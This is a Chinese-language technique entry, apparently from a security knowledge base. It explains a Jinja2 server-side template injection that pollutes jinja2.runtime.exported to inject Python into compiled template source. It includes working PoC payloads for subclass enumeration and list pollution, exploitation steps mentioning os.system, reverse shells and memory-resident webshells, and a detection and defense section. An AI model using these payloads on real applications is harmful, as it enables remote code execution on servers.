---
id: web-python-ssti-jinja2-runtime-exported-pollution
title: 污染 jinja2.runtime.exported 向生成的模板源码注入任意 Python 语句
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-runtime-exported-code-injection
tags:
- python
- jinja2
- flask
- ssti
- rce
- code-injection
- global-state
- ctf
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:34:52+08:00'
  notes: 已对照原文与截图 01 核对：visit_Template 生成 from jinja2.runtime import + 名字拼接、exported 为普通 list、经 Context.keys.__globals__ 取到模块并 append、第一次 append '*;' 的 traceback 证明拼接；未验证点：原文未展示第二条 payload 的最终命令输出，medium 合适，第二次编译才执行的分析正确
url: /docs/web/python/ssti/web-python-ssti-jinja2-runtime-exported-pollution/
draft: false
kb_aliases:
- Jinja2 runtime.exported 污染
- exported 列表注入
- 模板源码拼接注入
- from jinja2.runtime import 注入
---

## 一句话结论

Jinja2 编译模板时会生成 `from jinja2.runtime import <exported...>`，而 `jinja2.runtime.exported` 是一个进程级可变列表；攻击者通过 SSTI 找到该模块的类并执行 `exported.append('*;<code>;from jinja2.runtime import x')`，下一次编译模板时 `<code>` 就被拼进生成的 Python 源码并执行。

## 原理

- Jinja2 的 `CodeGenerator.visit_Template` 根据 `jinja2.runtime.exported` 生成模板运行时的导入语句；这些名字被直接拼接为源码文本。
- `exported` 在 `jinja2/runtime.py` 中定义为普通 list，没有只读保护；通过任意 `jinja2.runtime` 类的普通方法（如 `Context.keys`）取 `__globals__` 即可拿到该模块命名空间并修改它。
- 注入字符串以 `*;` 开头：`from jinja2.runtime import *;` 结束原导入语句，随后是攻击者的语句，再用 `from jinja2.runtime import new_context` 重新开启导入，吸收编译器追加的其余名字，保证整行语法合法。
- 污染是进程级全局状态：第一次请求只修改列表，下一次 `compile()` 才把恶意语句写入 `<template>` 源码并执行，因此通常需要两次模板编译/两个请求。
- 之所以成立：模板编译器信任模块级配置列表的内容，把“数据”直接当“代码文本”拼接，且该列表可被模板运行时触达。

## 触发条件

- 存在 Jinja2 SSTI，且可执行 `__subclasses__` 或等价自省拿到 `jinja2.runtime` 的类；
- 应用会继续编译模板（每次 `render_template_string` 或加载新模板都会触发），且未启用沙箱；
- 注入长度足够容纳 append 字符串；
- 进程未重启（重启后 `exported` 恢复默认）。

## 利用步骤

1. 枚举 `jinja2.runtime` 的类并取索引：遍历 `object.__subclasses__()`，筛 `c.__module__ == 'jinja2.runtime'`（如 `Context`、`TemplateReference`、`LoopContext`）。
2. 取该类的普通方法的 `__globals__`，确认存在 `exported` 列表。
3. 发送 append payload，写入 `*;print(...);from jinja2.runtime import new_context`。
4. 再触发一次模板编译（下一个请求），恶意语句在生成源码中执行；可用于写文件、反弹 shell 或植入内存马。

## PoC

枚举索引：

```jinja2
{% set cs = range.__class__.__base__.__subclasses__() %}
{% for c in cs %}{% if c.__module__ == 'jinja2.runtime' %}{{ loop.index0 }}: {{ c.__name__ }}
{% endif %}{% endfor %}
```

污染（N 为上一步得到的 `Context` 索引，示例环境为 507）：

```jinja2
{{range.__class__.__base__.__subclasses__()[507].keys.__globals__.exported.append('*;print(114514);from jinja2.runtime import new_context')}}
```

下一次请求触发编译后，生成的模板源码形如：

```python
from jinja2.runtime import *;print(114514);from jinja2.runtime import new_context, LoopContext, Macro, Markup, ...
```

第一次只 append `'*;'` 时可见报错行 `from jinja2.runtime import *;, LoopContext, ...`——这正好证明列表内容被拼进了源码。

## 变体与关联

- 变体：向 `async_exported` 追加；把 `print` 换成写文件/`__import__('os').system(...)`；污染后让应用加载任意新模板触发编译；结合内存马让代码在后续请求持续执行。
- 关联：[[web-python-ssti-jinja2-flask-globals-rce]]、[[web-python-ssti-jinja2-subclasses-index-rce]]（前两步拿到自省能力）。
- 影响边界：需要两次编译/两个请求，且进程不重启；若应用预编译并缓存所有模板、不再编译新模板，或使用沙箱/只读运行时，利用不成立。
- 置信度说明：原文用 traceback 证明了注入字符串进入生成源码（`from jinja2.runtime import *;` 报错行），但未展示第二条 payload 的最终命令输出；机制可复现，最终执行按 Python 语法推导，故 confidence 定为 medium。

## 检测与防御

- 检测：请求中出现 `jinja2.runtime`、`exported.append`、`async_exported`；模板异常栈出现 `from jinja2.runtime import *;` 或异常导入行；`jinja2.runtime.exported` 列表长度/内容被修改（可在应用内周期性校验默认值）。
- 防御：不要把用户输入当模板源码；使用 `SandboxedEnvironment` 并禁止 `__globals__`/`__subclasses__`；升级 Jinja2 并关注该全局列表的使用方式；模板编译与渲染分离、预编译白名单模板；最小权限运行，异常时重启进程清除被污染状态。
